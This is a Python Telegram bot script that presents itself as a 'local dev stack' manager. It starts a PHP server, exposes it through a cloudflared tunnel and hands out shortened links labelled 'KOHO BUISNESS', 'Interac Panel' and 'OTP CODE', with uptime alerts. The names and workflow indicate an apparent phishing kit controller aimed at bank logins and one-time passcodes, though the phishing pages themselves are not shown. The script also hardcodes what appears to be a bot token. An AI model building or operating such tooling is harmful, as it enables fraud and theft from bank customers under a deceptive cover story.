#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, re, time, socket, subprocess, shutil, threading, requests, random, json
from pathlib import Path
from telebot import TeleBot, types
from telebot.apihelper import ApiTelegramException

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────────────────────
BASE = Path(__file__).resolve().parent
DOT_WWW = BASE / ".www"
WWW     = BASE / "www"
LOGS    = BASE / ".logs"; LOGS.mkdir(exist_ok=True)
DATA    = BASE / ".data"; DATA.mkdir(exist_ok=True)
WATCHERS_FILE = DATA / "watchers.json"

TOKEN = os.getenv("BOT_TOKEN", "8536070173:AAEEqV5EOXXqiCAOrZoHKKYbDt8_SvZB8RU")
if not TOKEN:
    raise SystemExit("❌ BOT_TOKEN not set")

PHP = shutil.which("php") or "php"
CF  = shutil.which("cloudflared") or "cloudflared"
CF_RE = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com")

PROJECT_NAME = "PROJECT-SARAH"
BOT_NAME = "Sarah"

bot = TeleBot(TOKEN, parse_mode="Markdown", threaded=True)

# ──────────────────────────────────────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────────────────────────────────────
class State:
    url = ""            # public tunnel URL (unshortened)
    url_short = ""      # shortened public URL
    port = 0
    started = 0.0
    watchers = set()
    progress_mid = {}   # chat_id -> message_id (single loader message)
    last_online = None  # None/True/False for edge-trigger alerts

S = State()

# ──────────────────────────────────────────────────────────────────────────────
# UTIL
# ──────────────────────────────────────────────────────────────────────────────
def log(msg: str):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}\n"
    print(line, end="")
    with open(LOGS / "debug.log", "a", encoding="utf-8") as f:
        f.write(line)

def load_watchers():
    if WATCHERS_FILE.exists():
        try: S.watchers = set(json.loads(WATCHERS_FILE.read_text()))
        except Exception: S.watchers = set()

def save_watchers():
    try: WATCHERS_FILE.write_text(json.dumps(list(S.watchers)))
    except Exception: pass

def free_port() -> int:
    s = socket.socket(); s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]; s.close(); return port

def http_ok(url: str, timeout=6) -> bool:
    try:
        r = requests.head(url, timeout=timeout, allow_redirects=True)
        if r.status_code in (405, 403):  # fallback
            r = requests.get(url, timeout=timeout)
        return 200 <= r.status_code < 300
    except Exception:
        return False

def ensure_dot_www():
    """Create minimal placeholders inside .www if missing."""
    DOT_WWW.mkdir(exist_ok=True)
    (DOT_WWW / "splash.php").write_text(
        "<?php http_response_code(200); ?><!doctype html><h1>Koho Web App</h1>",
        encoding="utf-8"
    ) if not (DOT_WWW / "splash.php").exists() else None
    (DOT_WWW / "blacklist.php").write_text(
        "<?php http_response_code(200); ?><!doctype html><h1>Admin Panel</h1>",
        encoding="utf-8"
    ) if not (DOT_WWW / "blacklist.php").exists() else None
    for extra in ("dashboard", "metrics", "docs"):
        d = DOT_WWW / extra
        if not d.exists():
            d.mkdir(parents=True, exist_ok=True)
            (d / "index.html").write_text(f"<!doctype html><h1>{extra.title()}</h1>", encoding="utf-8")
def shorten(url: str) -> str:
    """Shorten with clck.ru/--?url=...; return original on failure."""
    try:
        r = requests.get("https://clck.ru/--", params={"url": url}, timeout=6)
        t = r.text.strip()
        if r.ok and t.startswith("http"):
            return t
    except Exception:
        pass
    return url

def links_panel(base_url: str):
    """Add ?src=sarah param BEFORE shortening."""
    routes = [
        ("/splash.php",   "KOHO BUISNESS"),
        ("/blacklist.php","Interac Panel"),
        ("/otp.php",    "OTP CODE")
    ]
    panel = types.InlineKeyboardMarkup(row_width=2)
    for path, label in routes:
        raw = f"{base_url.rstrip('/')}{path}?src=sarah"
        short = shorten(raw)
        panel.add(types.InlineKeyboardButton(label, url=short))
    return panel

# ──────────────────────────────────────────────────────────────────────────────
# LOADER BAR (▮▯, max 15 blocks, fast)
# ──────────────────────────────────────────────────────────────────────────────
def block_bar(p: float, width: int = 15) -> str:
    p = max(0.0, min(1.0, p))
    n = int(round(width * p))
    return "▮"*n + "▯"*(width - n)

def send_single_loader(cid: int) -> int:
    """Send a single loader message; return message_id."""
    m = bot.send_message(cid, block_bar(0.0))
    S.progress_mid[cid] = m.message_id
    return m.message_id

def edit_loader(cid: int, message_id: int, p: float):
    """Edit the single loader; never send extra messages."""
    for _ in range(3):  # limited retries on rate-limit
        try:
            bot.edit_message_text(block_bar(p), cid, message_id)
            return
        except ApiTelegramException as e:
            s = str(e)
            if "Too Many Requests" in s:
                # crude retry-after handling
                time.sleep(1.2)
                continue
            # If it's "message can't be edited", just stop updates (keep it single)
            if "can't be edited" in s:
                return
            # other errors: small pause then retry once
            time.sleep(0.4)
    # give up quietly; no extra sends.

# ──────────────────────────────────────────────────────────────────────────────
# STACK CONTROL
# ──────────────────────────────────────────────────────────────────────────────
def kill_stack():
    for pat in ("php -S", "cloudflared"):
        subprocess.run(["pkill", "-f", pat], check=False)

def start_stack(progress_fn=None, timeout=30):
    """Clone .www→www, start PHP (serving www/) and cloudflared; return (ok, url)."""
    kill_stack()
    port = free_port()
    php_log = LOGS / f"php_{port}.log"
    cf_log  = LOGS / f"cf_{port}.log"
    open(php_log, "w").close(); open(cf_log, "w").close()

    php = subprocess.Popen(
        [PHP, "-S", f"127.0.0.1:{port}", "-t", str(WWW)],
        stdout=open(php_log, "ab"), stderr=subprocess.STDOUT
    )
    cf  = subprocess.Popen(
        [CF, "tunnel", "--url", f"http://127.0.0.1:{port}", "--loglevel", "info", "--no-autoupdate"],
        stdout=open(cf_log, "ab"), stderr=subprocess.STDOUT
    )

    found = ""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            txt = open(cf_log, encoding="utf-8", errors="ignore").read()
            m = CF_RE.search(txt)
            if m:
                found = m.group(0)
                break
        except Exception:
            pass
        if progress_fn:
            # 15 fast steps overall; progress_fn receives 0..1
            elapsed = time.time() - t0
            progress_fn(min(1.0, elapsed/timeout))
        time.sleep(0.15)

    if not found:
        try: php.terminate(); cf.terminate()
        except Exception: pass
        log("❌ Tunnel URL not found")
        return False, ""

    S.url = found
    S.url_short = shorten(found + "?src=sarah")
    S.port = port
    S.started = time.time()
    S.last_online = True
    log(f"✅ Started on :{port} → {S.url} (short: {S.url_short})")
    return True, S.url

# ──────────────────────────────────────────────────────────────────────────────
# UI
# ──────────────────────────────────────────────────────────────────────────────
def main_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("▶️ START", "📎 LINKS MENU", "⏹ STOP")
    kb.row("📊 STATUS", "📝 LOGS", "👁 WATCH")
    kb.row("❓ HELP", "⚠️ DISCLAIMER", "⚙️ SETTINGS")
    return kb

INTRO = (
    f"*Hi, I’m {BOT_NAME} — welcome to {PROJECT_NAME}.*\n"
    "I manage a local dev stack: clone site, start PHP, and open a cloudflared tunnel.\n"
    "Tap ▶️ *START* to boot the environment."
)

DISCLAIMER = (
    "*Important Notice*\n\n"
    "This bot helps manage a local dev environment. Keep credentials private."
)

HELP = (
    "*Commands*\n"
    "• ▶️ START — clone `.www` → `www/`, start PHP+tunnel, show links\n"
    "• 📎 LINKS MENU — quick board (shortened)\n"
    "• ⏹ STOP — stop processes\n"
    "• 📊 STATUS — online/offline & uptime\n"
    "• 📝 LOGS — recent activity\n"
    "• 👁 WATCH — outage/restore alerts (edge-triggered)\n"
    "• ⚠️ DISCLAIMER — safety note"
)

# ──────────────────────────────────────────────────────────────────────────────
# HANDLERS
# ──────────────────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start","help"])
def cmd_start(m):
    S.watchers.add(m.chat.id); save_watchers()
    bot.send_message(m.chat.id, INTRO, reply_markup=main_kb())
    if m.text and m.text.startswith("/help"):
        bot.send_message(m.chat.id, HELP, reply_markup=main_kb())

@bot.message_handler(func=lambda msg: True)
def main(m):
    text_raw = (m.text or "")
    text = text_raw.strip().upper()
    cid = m.chat.id
    S.watchers.add(cid); save_watchers()

    # START — supports "START https://manual.url"
    if text.startswith("START") or "▶️ START" in text_raw:
        # Manual URL shortcut if present
        manual = None
        for token in text_raw.split():
            if token.startswith("http://") or token.startswith("https://"):
                manual = token.strip()
                break

        # Send ONE loader message
        mid = send_single_loader(cid)

        if manual:
            S.url = manual
            S.url_short = shorten(S.url + "?src=sarah")
            S.started = time.time()
            S.last_online = True
            # fast animate to 100%
            for i in range(1, 16):
                edit_loader(cid, mid, i/15.0)
                time.sleep(0.06)
            bot.send_message(cid, "Links are ready.", reply_markup=links_panel(S.url))
            return

        # Real launch with dynamic edits (no extra messages)
        def pf(p):  # progress callback 0..1
            # map to 15 steps visually
            edit_loader(cid, mid, p)

        ok, _ = start_stack(progress_fn=pf, timeout=15)  # quick boot; loader matches 15 blocks
        # ensure we end at 100%
        edit_loader(cid, mid, 1.0)

        if not ok:
            bot.send_message(cid, "Couldn’t get a tunnel yet. Try START again.")
            return

        bot.send_message(cid, "Links are ready.", reply_markup=links_panel(S.url))
        return

    # LINKS
    if "LINKS" in text:
        if not S.url:
            bot.send_message(cid, "No tunnel yet. Tap START.")
        else:
            bot.send_message(cid, "Quick access:", reply_markup=links_panel(S.url))
        return

    # STOP
    if "STOP" in text or "⏹" in text:
        kill_stack()
        S.url = ""; S.url_short = ""; S.port = 0; S.started = 0.0; S.last_online = None
        bot.send_message(cid, "Processes stopped.", reply_markup=main_kb())
        return

    # STATUS
    if "STATUS" in text:
        if not S.url:
            bot.send_message(cid, "Offline — nothing running.", reply_markup=main_kb())
        else:
            ok = http_ok(f"{S.url.rstrip('/')}/splash.php")
            up = int(time.time() - S.started) if S.started else 0
            base = S.url_short or S.url
            bot.send_message(cid, f"{'🟢 Online' if ok else '🔴 Offline'}\nUptime: *{up}s*\nBase: {base}", reply_markup=main_kb())
        return

    # LOGS
    if "LOGS" in text:
        path = LOGS / "debug.log"
        data = path.read_text(errors="ignore") if path.exists() else ""
        tail = data[-1900:] if len(data) > 1900 else data
        bot.send_message(cid, f"*Recent activity*\n```\n{tail}\n```", parse_mode="Markdown", reply_markup=main_kb())
        return

    # WATCH
    if "WATCH" in text or "👁" in text:
        if cid in S.watchers:
            S.watchers.remove(cid); save_watchers()
            bot.send_message(cid, "Watch disabled.", reply_markup=main_kb())
        else:
            S.watchers.add(cid); save_watchers()
            bot.send_message(cid, "Watch enabled. I’ll ping once if it drops, once if it’s back.", reply_markup=main_kb())
        return

    # DISCLAIMER / SETTINGS / HELP
    if "DISCLAIMER" in text:
        bot.send_message(cid, DISCLAIMER, reply_markup=main_kb()); return
    if "SETTINGS" in text:
        bot.send_message(cid, "Minimal settings for now.", reply_markup=main_kb()); return
    if "HELP" in text:
        bot.send_message(cid, HELP, reply_markup=main_kb()); return

    # Fallback
    bot.send_message(cid, "Try START or STATUS.", reply_markup=main_kb())

# ──────────────────────────────────────────────────────────────────────────────
# MONITOR (edge-triggered once-down / once-up)
# ──────────────────────────────────────────────────────────────────────────────
def monitor_loop():
    while True:
        time.sleep(10)
        if not S.url or not S.watchers:
            continue
        online = http_ok(f"{S.url.rstrip('/')}/splash.php")
        if S.last_online is None:
            S.last_online = online
            continue
        if online != S.last_online:
            S.last_online = online
            msg = "⚠️ Link went down." if not online else "✅ Link is back online."
            for cid in list(S.watchers):
                try: bot.send_message(cid, msg)
                except Exception: pass

# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    load_watchers()
    threading.Thread(target=monitor_loop, daemon=True).start()
    log("Bot online.")
    bot.infinity_polling(timeout=30, long_polling_timeout=25)
